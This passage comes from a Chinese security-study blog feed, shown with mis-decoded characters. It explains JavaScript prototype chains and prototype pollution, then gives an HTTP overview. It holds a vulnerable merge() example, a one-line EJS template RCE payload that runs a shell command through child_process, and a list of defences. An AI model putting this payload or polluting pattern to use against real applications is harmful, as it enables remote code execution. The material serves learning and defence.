·å°±æ„æˆäº†åŸå‹é“¾</p><p>ç®€å•æ¥è¯´ï¼ŒåŸå‹é“¾æ˜¯javascriptä¸­ç±»ç»§æ‰¿çš„ä¸€ç§æœºåˆ¶ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰å¯¹åº”çš„åŸå‹ï¼Œå‚¨å­˜äº†å®šä¹‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¹‹ä¸­åŒ…å«äº†prototypeï¼ŒæŒ‡å‘ä¸Šä¸€çº§çš„åŸå‹ã€‚æœ€ä¸Šå±‚ObjectåŸå‹ä¸­çš„prototypeä¸ºnull</p><p><strong>ç‰¹æ€§</strong></p><p>ç±»å®šä¹‰ä¸­çš„å±æ€§ï¼Œä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶åœ¨å¯¹è±¡ä¸­åˆ›å»ºï¼Œç±»å®šä¹‰çš„æ–¹æ³•è€Œæ˜¯å­˜åœ¨äºåŸå‹ä¹‹ä¸­ã€‚å½“ä½¿ç”¨æ²¡æœ‰å®šä¹‰çš„å±æ€§å’Œæ–¹æ³•æ—¶ï¼Œå°±ä¼šé¡ºç€åŸå‹é“¾ä¸€ç›´å¯»æ‰¾ï¼Œç›´åˆ°ä¸ºundefined,ç”¨æ­¤æ¥å®ç°ç»§æ‰¿ï¼Œå­ç±»èƒ½ç”¨çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•</p><p>ç¤ºä¾‹</p><pre class="language-none"><code class="language-none">function Person(name) {       this.name = name;   }   Person.prototype.greet = function () {       console.log(`Hello, my name is ${this.name}`);   };   const person1 = new Person('Alice');   person1.greet(); // è¾“å‡º "Hello, my name is Alice"</code></pre><p><img src="/./js.jpg" alt="img"></p><p>â€‹<em>person1å¯¹è±¡åŸå‹å¯¹è±¡å±•ç¤º</em></p><p><strong>prototypeä¸__proto__</strong></p><p>(1)æ‰€æœ‰å¼•ç”¨ç±»å‹ï¼ˆå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ï¼‰éƒ½æ‹¥æœ‰<code>__proto__</code>å±æ€§ï¼ˆéšå¼åŸå‹ï¼‰,ç”¨æ¥æŸ¥çœ‹å…¶åŸå‹</p><p>(2)æ‰€æœ‰å‡½æ•°æ‹¥æœ‰<code>prototype</code>å±æ€§ï¼ˆæ˜¾å¼åŸå‹ï¼‰ï¼ˆä»…é™å‡½æ•°ï¼‰</p><p> ç®€å•æ¥è¯´ï¼Œ<strong>proto</strong> å±æ€§æ˜¯æŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹ï¼Œè€Œ prototypeå±æ€§æ˜¯ç”¨äºåˆ›å»ºè¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°çš„åŸå‹ã€‚</p><h3 id="Function-ä¸function"><a href="#Function-ä¸function" class="headerlink" title="Function ä¸function"></a>Function ä¸function</h3><p>functionæ˜¯ä¸€ä¸ªå®šä¹‰å‡½æ•°çš„å…³é”®å­—ï¼ŒFunctionæ˜¯ä»£è¡¨æ‰€æœ‰å‡½æ•°çš„å†…ç½®åŸå‹å¯¹è±¡</p><p>æ¯ä¸€ä¸ªjs çš„functionéƒ½æ˜¯Functionå¯¹è±¡ï¼ŒFunctionæ˜¯jså†…ç½®å¯¹è±¡ï¼Œç”¨ä»¥å®ç°å¾ˆå¤šåŸºæœ¬åŠŸèƒ½ï¼Œå¦‚Nunmber,toString</p><p>constructoræ˜¯ä¸€ä¸ªå¯¹è±¡æ•°æ®å±æ€§å±æ€§,åˆ›å»ºå¯¹è±¡åï¼Œè®¿é—®constructorå±æ€§ï¼Œå¯ä»¥è¿”å›æ„é€ è¯¥å¯¹è±¡çš„æ¥æºï¼ˆä¸æ˜¯è¯¥å¯¹è±¡çš„åŸå‹é“¾ä¸Šçº§ï¼‰</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>new constructor[([arguments])]</p><p>å‚æ•°</p><p><code>constructor</code></p><p>ä¸€ä¸ªæŒ‡å®šå¯¹è±¡å®ä¾‹çš„ç±»å‹çš„ç±»æˆ–å‡½æ•°ã€‚</p><p>æè¿°</p><p><code>new</code> å…³é”®å­—ä¼šè¿›è¡Œå¦‚ä¸‹çš„æ“ä½œï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ªç©ºçš„ç®€å• JavaScript å¯¹è±¡ï¼ˆå³ <code>{}</code>ï¼‰ï¼›</li><li>ä¸ºæ­¥éª¤ 1 æ–°åˆ›å»ºçš„å¯¹è±¡æ·»åŠ å±æ€§ <code>__proto__</code>ï¼Œå°†è¯¥å±æ€§é“¾æ¥è‡³æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼›</li><li>å°†æ­¥éª¤ 1 æ–°åˆ›å»ºçš„å¯¹è±¡ä½œä¸º <code>this</code> çš„ä¸Šä¸‹æ–‡ï¼›</li><li>å¦‚æœè¯¥å‡½æ•°æ²¡æœ‰è¿”å›å¯¹è±¡ï¼Œåˆ™è¿”å› <code>this</code>ã€‚</li></ol><h3 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h3><p>å½“æˆ‘ä»¬æ·»åŠ æˆ–è€…ä¿®æ”¹ä¸Šå±‚åŸå‹çš„ä¸€äº›å±æ€§ï¼Œå­ç±»éƒ½åˆè°ƒç”¨è¯¥æ¶æ„å±æ€§æ—¶ï¼Œå­ç±»è°ƒç”¨çš„å±æ€§å·²ç»è¢«æˆ‘ä»¬ç¯¡æ”¹ï¼Œé€ æˆåŸå‹é“¾æ±¡æŸ“ï¼ŒåŸå‹é“¾æ±¡æŸ“å¯èƒ½ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œ(rce)æˆ–è€…ä»»æ„æ–‡ä»¶è¯»å–,è¶Šæƒç­‰ç­‰</p><p>ç¤ºä¾‹</p><pre class="language-none"><code class="language-none">function merge(target, source) {      for (let key in source) {          if (key in source &amp;&amp; key in target) {              // å¦‚æœtargetä¸sourceæœ‰ç›¸åŒçš„é”®å åˆ™è®©targetçš„é”®å€¼ä¸ºsourceçš„é”®å€¼              merge(target[key], source[key])          } else {              target[key] = source[key]  // å¦‚æœtargetä¸sourceæ²¡æœ‰ç›¸é€šçš„é”®å åˆ™ç›´æ¥åœ¨targetæ–°å»ºé”®åå¹¶èµ‹ç»™é”®å€¼          }      }  }  let o1 = {}  let o2 = JSON.parse('{ "a": 1, "__proto__": { "b": 2} }');  merge(o1, o2)  console.log(o1.a, o1.b)  o3 = {}  console.log(o3.b)</code></pre><p>æ¼æ´ç‚¹</p><p>ä¸€èˆ¬å¯¹å¯¹è±¡è¿›è¡Œå¤åˆ¶æ‹·è´,å¦‚mergeå‡½æ•°æˆ–è€…copyå‡½æ•°ï¼Œä¼šå°†ä¼ å…¥çš„jsonæ•°æ®æ‹·è´è‡³å·²åˆ›å»ºå¯¹è±¡ï¼Œæ­¤æ—¶å¯èƒ½ä¼šäº§ç”ŸåŸå‹é“¾æ±¡æŸ“</p><h4 id="ejsæ¨¡æ¿åŸºäºåŸå‹é“¾æ±¡æŸ“çš„rce"><a href="#ejsæ¨¡æ¿åŸºäºåŸå‹é“¾æ±¡æŸ“çš„rce" class="headerlink" title="ejsæ¨¡æ¿åŸºäºåŸå‹é“¾æ±¡æŸ“çš„rce"></a>ejsæ¨¡æ¿åŸºäºåŸå‹é“¾æ±¡æŸ“çš„rce</h4><p>ç›´æ¥ä¸ŠPOC</p><pre class="language-none"><code class="language-none">a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); //</code></pre><p>å‚è€ƒå­¦ä¹ ï¼š<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><p>å¯¹äº<code>toUpperCase()</code>å‡½æ•°</p><pre class="language-none"><code class="language-none">å­—ç¬¦"Ä±"ã€"Å¿" ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º "I"ã€"S"</code></pre><p>å¯¹äº<code>toLowerCase</code></p><pre class="language-none"><code class="language-none">å­—ç¬¦"K"ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º"k"(è¿™ä¸ªKä¸æ˜¯K)</code></pre><p>è¯¦æƒ…å¯è§pç¥çš„æ–‡ç« <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com</a></p><p>pythonä¸­ä¹Ÿå­˜åœ¨åŸå‹é“¾æ±¡æŸ“</p><p>å¯å‚è€ƒæ–‡ç« ï¼š<a href="https://tttang.com/archive/1876">https://tttang.com/archive/1876</a></p><p>ctfä¾‹é¢˜ï¼š<a href="https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5">https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5</a></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>1.Object.freeze()å†»ç»“åŸå‹</p><pre class="language-none"><code class="language-none">Object.freeze(Object.prototype);Object.freeze(Object)</code></pre><p>å†»ç»“åŸå‹åï¼Œæ— æ³•æ·»åŠ æ–°çš„åŸå‹è‡³åŸå‹é“¾</p><p>2.å¯¹JSONè¾“å…¥éªŒè¯</p><p>npmä¸Šæœ‰å¾ˆå¤šåº“ï¼Œå¦‚avjï¼Œå¯ä»¥å¯¹JSONæ•°æ®éªŒè¯ï¼Œæ’é™¤jsonä¸­æ•°æ®ä¸­ä¸éœ€è¦çš„å±æ€§</p><p>æˆ–è€…åœ¨å¤åˆ¶å¯¹è±¡æ—¶ï¼Œéå†é”®åæ—¶å€™ï¼Œæ£€æŸ¥__proto__å’Œprototype</p><p>3.ä½¿ç”¨mapä»£æ›¿{}</p><p>4.ä½¿ç”¨Object.create()å®‰å…¨åˆ›å»ºå¯¹è±¡</p><p>è¿™æ ·åˆ›å»ºçš„å¯¹è±¡æ²¡æœ‰å±æ€§</p><p>5.node.jsä¸­å¯ä»¥é€šè¿‡disable-protoç›´æ¥ç¦æ­¢æ“ä½œåŸå‹é“¾</p>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httpæ¦‚è¿°</title>
      <link href="/2023/07/20/http%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/07/20/http%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<hr><ul><li><h4 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>â€‹Web ä½¿ç”¨ä¸€ç§åä¸º HTTPï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®® ï¼‰çš„åè®®ä½œä¸ºè§„èŒƒï¼Œå®Œæˆä»å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯ç­‰ä¸€ç³»åˆ—è¿ä½œæµ ç¨‹ã€‚è€Œåè®®æ˜¯æŒ‡è§„åˆ™çš„çº¦å®šã€‚Web æ˜¯å»ºç«‹åœ¨ HTTP åè®®ä¸Šé€š ä¿¡çš„ã€‚ httpåè®®ä¸»è¦æ˜¯è®¡ç®—æœºç½‘ç»œç³»ç»Ÿä¸Šçš„åº”   ç”¨å±‚ã€‚</p></li><li><h4 id="TCP-IPåè®®æ—"><a href="#TCP-IPåè®®æ—" class="headerlink" title="TCP/IPåè®®æ—"></a>TCP/IPåè®®æ—</h4><h5 id="ä¸»è¦å†…å®¹ï¼š"><a href="#ä¸»è¦å†…å®¹ï¼š" class="headerlink" title="ä¸»è¦å†…å®¹ï¼š"></a>ä¸»è¦å†…å®¹ï¼š</h5></li></ul><pre class="language-none"><code class="language-none">åº”ç”¨å±‚ï¼šFTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰å’ŒDNSï¼ˆåŸŸåç³»ç»Ÿï¼‰å’Œhttpåè®®ä¼ è¾“å±‚ï¼šTCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰å’ŒUDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ç½‘ç»œå±‚ï¼šå¤„ç†åœ¨ç½‘ç»œä¸ŠæµåŠ¨çš„æ•°æ®åŒ… é“¾è·¯å±‚ï¼šå¤„ç†è¿æ¥ç½‘ç»œçš„ç¡¬ä»¶éƒ¨åˆ† </code></pre><ul><li><h4 id="IPã€TCPå’ŒDNSï¼š"><a href="#IPã€TCPå’ŒDNSï¼š" class="headerlink" title="IPã€TCPå’ŒDNSï¼š"></a>IPã€TCPå’ŒDNSï¼š</h4></li></ul><pre class="language-none"><code class="language-none">**IP**IPåœ°å€ï¼šæŒ‡æ˜è¢«åˆ†é…çš„åœ°å€MACåœ°å€ï¼šæŒ‡ç½‘å¡æ‰€å±å›ºå®šçš„åœ°å€è¿ä½œæ–¹å¼ï¼šåˆ©ç”¨IPæŒ‡æ˜ç›®æ ‡ï¼Œä¸­è½¬æ—¶åˆ©ç”¨ä¸‹ä¸€ç«™ä¸­è½¬è®¾å¤‡çš„MACåœ°å€æœç´ ä¸‹ä¸€ä¸ªä¸­è½¬ç›®æ ‡ã€‚åˆ©ç”¨ARPåè®®å¯ä»¥æ ¹æ®IPåœ°å€è§£æå‡ºMACåœ°å€ã€‚**TCP**TCPæä¾›å­—èŠ‚æµæœåŠ¡ï¼ŒæŠŠæ•°æ®åˆ†å‰²ï¼Œå¹¶é€šè¿‡å¸¦SYN/ACKçš„æ•°æ®åŒ…ï¼ˆä¸‰æ¬¡ï¼‰ç¡®å®šæ˜¯å¦æœ€ç»ˆä¼ é€åˆ°å¯¹æ–¹ã€‚**DNS**æä¾›åŸŸåå’ŒIPä¹‹é—´è§£ææœåŠ¡</code></pre><ul><li><h4 id="URIå’ŒURL"><a href="#URIå’ŒURL" class="headerlink" title="URIå’ŒURL"></a>URIå’ŒURL</h4><p>â€‹URIï¼šæ˜¯ç”±æŸä¸ªåè®®æ–¹æ¡ˆè¡¨ç¤ºçš„èµ„æºçš„å®šä½æ ‡è¯†ç¬¦</p><p>â€‹URL:æ˜¯ä½¿ç”¨ Web æµè§ˆå™¨ç­‰ è®¿é—® Web é¡µé¢æ—¶éœ€è¦è¾“å…¥çš„ç½‘é¡µåœ°å€ </p><p>â€‹URIæ ¼å¼ï¼šåè®®æ–¹æ¡ˆå+ç™»å½•ä¿¡æ¯ï¼ˆè®¤è¯ï¼‰+æœåŠ¡å™¨åœ°å€+æœåŠ¡å™¨ç«¯å£å·+å¸¦å±‚æ¬¡çš„æ–‡ä»¶è·¯å¾„+æŸ¥è¯¢å­—ç¬¦ä¸²+ç‰‡æ®µæ ‡è¯†ç¬¦å¦‚ï¼š<a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>â€‹</p></li></ul><p></p><h3 id="ç®€å•çš„httpåè®®"><a href="#ç®€å•çš„httpåè®®" class="headerlink" title="ç®€å•çš„httpåè®®"></a>ç®€å•çš„httpåè®®</h3><hr><p>HTTP åè®®è§„å®šï¼Œè¯·æ±‚ä»å®¢æˆ·ç«¯å‘å‡ºï¼Œæœ€åæœåŠ¡å™¨ç«¯å“åº”è¯¥è¯·æ±‚å¹¶è¿”å›ã€‚</p><p>â€‹ <strong>è¯·æ±‚æŠ¥æ–‡</strong>ï¼šä¸»è¦ç”±è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚URIã€åè®®ç‰ˆæœ¬ã€å¯é€‰çš„è¯·æ±‚é¦–éƒ¨å­—æ®µå’Œå†…å®¹å®ä½“æ„æˆã€‚</p><p>â€‹<strong>å“åº”æŠ¥æ–‡</strong>ï¼šåŸºæœ¬ç”±åè®®ç‰ˆæœ¬ã€çŠ¶æ€ç ï¼ˆè¡¨ç¤ºè¯·æ±‚æˆåŠŸæˆ–å¤±è´¥çš„æ•°å­—ä»£ç ï¼‰ã€ç”¨ä»¥è§£é‡ŠçŠ¶æ€ç çš„åŸå› çŸ­è¯­ã€å¯é€‰çš„å“åº”é¦–éƒ¨å­—æ®µä»¥åŠå®ä½“æ„æˆã€‚ </p><h5 id="HTTPæ–¹æ³•"><a href="#HTTPæ–¹æ³•" class="headerlink" title="HTTPæ–¹æ³•"></a>HTTPæ–¹æ³•</h5><pre class="language-none"><code class="language-none">**GET: è·å–èµ„æº**GETæ–¹æ³•ç”¨æ¥è¯·æ±‚è®¿é—®å·²è¢« URI è¯†åˆ«çš„èµ„æº**POST: ä¼ è¾“å®ä½“ä¸»ä½“****PUTï¼š ä¼ è¾“æ–‡ä»¶**ç”±äºPUTæ–¹æ³•è‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œå­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¸€èˆ¬çš„ Web ç½‘ç«™ä¸ä½¿ç”¨è¯¥æ–¹æ³•**HEARD ï¼šè·å–æŠ¥æ–‡é¦–éƒ¨**ä¸è¿”å›æŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†ã€‚ç”¨äºç¡®è®¤URIçš„æœ‰æ•ˆæ€§åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰**DELETEï¼š åˆ é™¤æ–‡ä»¶****OPTIONSï¼š æŸ¥è¯¢æ”¯æŒæ–¹æ³•**ç”¨æ¥æŸ¥è¯¢é’ˆå¯¹URIæŒ‡å®šçš„èµ„æºæ”¯æŒçš„æ–¹æ³•**TRACE: è¿½è¸ªè·¯å¾„**è®© Web æœåŠ¡å™¨ç«¯å°†ä¹‹å‰çš„è¯·æ±‚é€šä¿¡ç¯å›ç»™å®¢æˆ·ç«¯çš„æ–¹æ³•ã€‚å®¢æˆ·ç«¯é€šè¿‡ TRACE æ–¹æ³•å¯ä»¥æŸ¥è¯¢å‘é€å‡ºå»çš„è¯·æ±‚æ˜¯æ€æ ·è¢«åŠ å·¥ä¿®æ”¹/ç¯¡æ”¹çš„ã€‚å®¹æ˜“å¼•å‘XSTæ”»å‡»**CONNECTï¼šè¦æ±‚ç”¨éš§é“åè®®è¿æ¥ä»£ç†**æ–¹æ³•è¦æ±‚åœ¨ä¸ä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“ï¼Œå®ç°ç”¨éš§é“åè®®è¿›è¡Œ TCP é€šä¿¡ã€‚ä¸»è¦ä½¿ç”¨ SSLï¼ˆå®‰å…¨å¥—æ¥å±‚ï¼‰å’Œ TLSï¼ˆä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚</code></pre><p>â€‹ç®¡çº¿åŒ–ï¼šåˆ©ç”¨æŒä¹…åŒ–è¿æ¥ï¼Œå‘é€è¯·æ±‚åä¸ç”¨ç­‰å¾…å›åº”å°±å¯ç›´æ¥å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</p><p>â€‹<strong>Cookie</strong>:é€šå¸¸ç”¨äºåˆ¤æ–­ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨ï¼ŒCookie æŠ€æœ¯é€šè¿‡åœ¨è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ä¸­å†™å…¥ Cookie ä¿¡æ¯æ¥æ§åˆ¶å®¢æˆ·ç«¯çš„çŠ¶æ€ ã€‚</p><h3 id="httpæŠ¥æ–‡"><a href="#httpæŠ¥æ–‡" class="headerlink" title="httpæŠ¥æ–‡"></a>httpæŠ¥æ–‡</h3><hr><h4 id="HTTPä¿¡æ¯"><a href="#HTTPä¿¡æ¯" class="headerlink" title="HTTPä¿¡æ¯"></a>HTTPä¿¡æ¯</h4><p>â€‹é¦–éƒ¨å†…å®¹ï¼šè¯·æ±‚è¡Œã€çŠ¶æ€è¡Œã€é¦–éƒ¨å­—æ®µ</p><p>â€‹æŠ¥æ–‡ï¼šæ˜¯ HTTP é€šä¿¡ä¸­çš„åŸºæœ¬å•ä½ï¼Œç”± 8 ä½ç»„å­—èŠ‚æµç»„æˆï¼Œé€šè¿‡ HTTP é€šä¿¡ä¼ è¾“ã€‚ </p><p>â€‹å®ä½“ï¼šä½œä¸ºè¯·æ±‚æˆ–å“åº”çš„æœ‰æ•ˆè½½è·æ•°æ®ï¼ˆè¡¥å……é¡¹ï¼‰è¢«ä¼ è¾“ï¼Œå…¶å†…å®¹ç”±å® ä½“é¦–éƒ¨å’Œå®ä½“ä¸»ä½“ç»„æˆã€‚ </p><p>â€‹å¸¸è§å‹ç¼©ä¼ è¾“çš„å†…å®¹ç¼–ç ï¼šgzipã€compressã€deflateã€identity</p><h5 id="å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ"><a href="#å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ" class="headerlink" title="å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ"></a>å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ</h5><ul><li><p>multipart/form-data</p><p>â€‹webè¡¨å•æ–‡ä»¶ä¸Šä¼ æ—¶ä½¿ç”¨</p></li><li><p>multipart/byteranges</p><p>â€‹çŠ¶æ€ç 206å“åº”æŠ¥æ–‡åŒ…å«äº†å¤šä¸ªèŒƒå›´çš„å†…å®¹æ—¶ä½¿ç”¨</p><p>è·å–éƒ¨åˆ†å†…å®¹çš„èŒƒå›´è¯·æ±‚ï¼šç”¨åˆ°é¦–éƒ¨å­—æ®µRangeæ¥æŒ‡å®šèµ„æºçš„byteèŒƒå›´</p><p>å†…å®¹åå•†æŠ€æœ¯ï¼šæœåŠ¡å™¨é©±åŠ¨åå•†ã€å®¢æˆ·ç«¯é©±åŠ¨åå•†ã€é€æ˜åå•†</p></li></ul><h3 id="httpçŠ¶æ€ç "><a href="#httpçŠ¶æ€ç " class="headerlink" title="httpçŠ¶æ€ç "></a>httpçŠ¶æ€ç </h3><hr><h5 id="çŠ¶æ€ç ç±»åˆ«"><a href="#çŠ¶æ€ç ç±»åˆ«" class="headerlink" title="çŠ¶æ€ç ç±»åˆ«"></a>çŠ¶æ€ç ç±»åˆ«</h5><table><thead><tr><th></th><th>ç±»åˆ«</th><th>åŸå› çŸ­è¯­</th></tr></thead><tbody><tr><td>1XX</td><td>ä¿¡æ¯æ€§çŠ¶æ€ç </td><td>æ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç†</td></tr><tr><td>2XX</td><td>æˆåŠŸçŠ¶æ€ç </td><td>è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯•</td></tr><tr><td>3XX</td><td>é‡å‘çŠ¶æ€ç </td><td>éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚</td></tr><tr><td>4XX</td><td>å®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç </td><td>æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚</td></tr><tr><td>5XX</td><td>æœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç </td><td>æœåŠ¡å™¨å¤„ç†å‡ºé”™</td></tr></tbody></table><h5 id="14ç§å¸¸è§çš„çŠ¶æ€ç "><a href="#14ç§å¸¸è§çš„çŠ¶æ€ç " class="headerlink" title="14ç§å¸¸è§çš„çŠ¶æ€ç "></a>14ç§å¸¸è§çš„çŠ¶æ€ç </h5><pre class="language-none"><code class="language-none">**200 OK**è¯·æ±‚è¢«æ­£å¸¸å¤„ç†**204 No Content**è¯·æ±‚å·²æˆåŠŸå¤„ç†ï¼Œä½†å“åº”æŠ¥æ–‡ä¸­ä¸å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ï¼Œä¹Ÿä¸å…è®¸è¿”å›ä»»ä½•å®ä½“çš„ä¸»ä½“**206 Partial Content**å®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼ŒæœåŠ¡å™¨æˆåŠŸæ‰§è¡Œè¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡ä¸­åŒ…å«ç”±Content-RangeæŒ‡å®šèŒƒå›´çš„å®ä½“èŒƒå›´**301 Moved Permanently**æ°¸ä¹…æ€§å®šå‘ã€‚--è¯·æ±‚çš„èµ„æºå·²ç»è¢«åˆ†é…åˆ°äº†æ–°çš„URI**302 Found**ä¸´æ—¶æ€§é‡å®šå‘ã€‚**303 See Other**è¡¨ç¤ºè¯·æ±‚å¯¹åº”çš„èµ„æºå­˜åœ¨å¦ä¸€ä¸ªURIï¼Œåº”ä½¿ç”¨GETæ–¹æ³•å®šå‘è·å–è¯·æ±‚èµ„æº**304 Not Modified**æ— éœ€å†æ¬¡ä¼ è¾“è¯·æ±‚çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ç¼“å­˜çš„å†…å®¹ã€‚**307 Temporary Redirect**ä¸´æ—¶é‡å®šå‘,ä¿æŒåŸæœ‰ä¿¡æ¯**400 Bad Request**æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ï¼Œéœ€è¦ä¿®æ”¹è¯·æ±‚é‡æ–°å‘é€**401 Unauthorized**è¡¨ç¤ºå‘é€è¯·æ±‚éœ€è¦æœ‰é€šè¿‡HTTPè®¤è¯çš„è®¤è¯ä¿¡æ¯ï¼Œè‹¥ä¹‹å‰è¿›è¡Œè¿‡1æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥**403 Forbiddenè¯·æ±‚èµ„æºçš„è®¿é—®è¢«æœåŠ¡å™¨æ‹’ç»**404 Not Found**æœåŠ¡å™¨ä¸Šæ— æ³•æ‰¾åˆ°è¯·æ±‚çš„èµ„æº**500 Internal Server Error**æœåŠ¡å™¨åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿäº†é”™è¯¯ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯Webåº”ç”¨å­˜åœ¨çš„bugæˆ–ä¸´æ—¶çš„æ•…éšœ**503 Service Unavailable**æœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚</code></pre><h3 id="webæœåŠ¡å™¨"><a href="#webæœåŠ¡å™¨" class="headerlink" title="webæœåŠ¡å™¨"></a>webæœåŠ¡å™¨</h3><hr><h4 id="é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº"><a href="#é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº" class="headerlink" title="é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº"></a>é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº</h4><pre class="language-none"><code class="language-none">**ä»£ç†**ä½œä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„â€˜ä¸­é—´äººâ€™ç¼“å­˜ä»£ç†ï¼šä¼šé¢„å…ˆæŠŠèµ„æºçš„å‰¯æœ¬ï¼ˆç¼“å­˜ï¼‰ä¿å­˜åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šé€æ˜ä»£ç†ï¼šè½¬å‘è¯·æ±‚æˆ–å“åº”æ—¶ï¼Œä¸å¯¹æŠ¥æ–‡åšä»»ä½•åŠ å·¥ä»£ç†**ç½‘å…³**è½¬å‘æ¥è‡ªå…¶ä»–æœåŠ¡å™¨é€šä¿¡æ•°æ®çš„æœåŠ¡å™¨ï¼Œå¯¹å®¢æˆ·ç«¯çš„è¯·æ±‚è¿›è¡Œå¤„ç†ç½‘å…³å¯ä»¥ä½¿é€šä¿¡çº¿è·¯ä¸Šçš„æœåŠ¡å™¨æä¾›éHTTPåè®®æœåŠ¡ï¼Œæé«˜å®‰å…¨æ€§ã€‚**éš§é“**æ˜¯åœ¨ç›¸éš”ç”šè¿œçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œä¸­è½¬ï¼Œå¹¶ä¿æŒåŒæ–¹é€šä¿¡è¿æ¥çš„åº”ç”¨ç¨‹åºç›®çš„æ˜¯ä¸ºäº†è¿›è¡Œå®‰å…¨çš„é€šä¿¡</code></pre><h5 id="httpå‡ºç°ä¹‹å‰çš„åè®®"><a href="#httpå‡ºç°ä¹‹å‰çš„åè®®" class="headerlink" title="httpå‡ºç°ä¹‹å‰çš„åè®®"></a>httpå‡ºç°ä¹‹å‰çš„åè®®</h5><p>â€‹FTP:ä¼ è¾“æ–‡ä»¶æ—¶ä½¿ç”¨çš„åè®®</p><p>â€‹NNTPï¼šç”¨äº NetNews ç”µå­ä¼šè®®å®¤å†…ä¼ é€æ¶ˆæ¯çš„åè®® </p><p>â€‹Archie ï¼šæœç´¢ anonymous FTP å…¬å¼€çš„æ–‡ä»¶ä¿¡æ¯çš„åè®® </p><p>â€‹WAIS 